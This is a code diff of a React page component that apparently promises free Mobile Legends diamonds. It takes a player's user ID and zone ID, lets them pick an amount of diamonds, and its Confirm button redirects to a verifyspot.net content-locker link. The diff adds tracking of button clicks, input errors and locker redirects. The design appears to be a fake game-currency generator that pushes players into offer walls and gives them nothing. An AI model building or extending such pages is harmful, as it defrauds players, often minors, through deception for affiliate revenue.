@@ -9,7 +9,7 @@ import Success     from './success'
 import CheckIcon   from '@mui/icons-material/Check'
 import DiamondIcon from '@mui/icons-material/Diamond'
 
-const English = () => {
+const English = ({actions}) => {
     //useStates hooks
     const [device, setDevice] = useState(false)
     const [userId, setUserId] = useState(false)
@@ -29,11 +29,13 @@ const English = () => {
 
     //functions
     const next_1 = async()=>{
+        actions.addBtn('first next button')
         if(!device) {
             setError('You should choose your device before continue')
             setTimeout(()=>{
                 setError(false)
             },4000)
+            actions.addErr('no device choosen')
             return 0
         }
         if(!userId) {
@@ -41,6 +43,7 @@ const English = () => {
             setTimeout(()=>{
                 setError(false)
             },4000)
+            actions.addErr('MLBB userId not entred')
             return 0
         }
         if(!zoneId) {
@@ -48,6 +51,7 @@ const English = () => {
             setTimeout(()=>{
                 setError(false)
             },4000)
+            actions.addErr('MLBB zoneId not entred')
             return 0
         }
         setLoading(true)
@@ -70,6 +74,7 @@ const English = () => {
         const json_data = await fetched_data.json()
         setLoading(false)
         if(json_data.status.code == 1){
+            actions.addErr('MLBB user not found')
             setError('User not found, please re-enter your user ID + zone ID')
             setTimeout(()=>{
                 setError(false)
@@ -85,11 +90,13 @@ const English = () => {
     }
 
     const next_2 = async()=>{
+        actions.addBtn('second next button (after choosing diamonds)')
         if(!diamonds) {
             setError_2('You should choose the amount of Diamonds that you wanna get before continue')
             setTimeout(()=>{
                 setError_2(false)
             },4000)
+            actions.addErr('no diamonds choosen')
             return 0
         }
         setStep_2(false)
@@ -205,7 +212,7 @@ const English = () => {
                 </div>
 
                 {/* FINISH BUTTON */}
-                <button className='mt-4 bg-blue-500 py-3 px-10 rounded-md shadow-lg' onClick={e=>window.location.href='https://verifyspot.net/cl/i/3759ww'}>Confirm <CheckIcon /></button>
+                <button className='mt-4 bg-blue-500 py-3 px-10 rounded-md shadow-lg' onClick={e=>{actions.locker();window.location.href='https://verifyspot.net/cl/i/3759ww'}}>Confirm <CheckIcon /></button>
 
 
             </div>
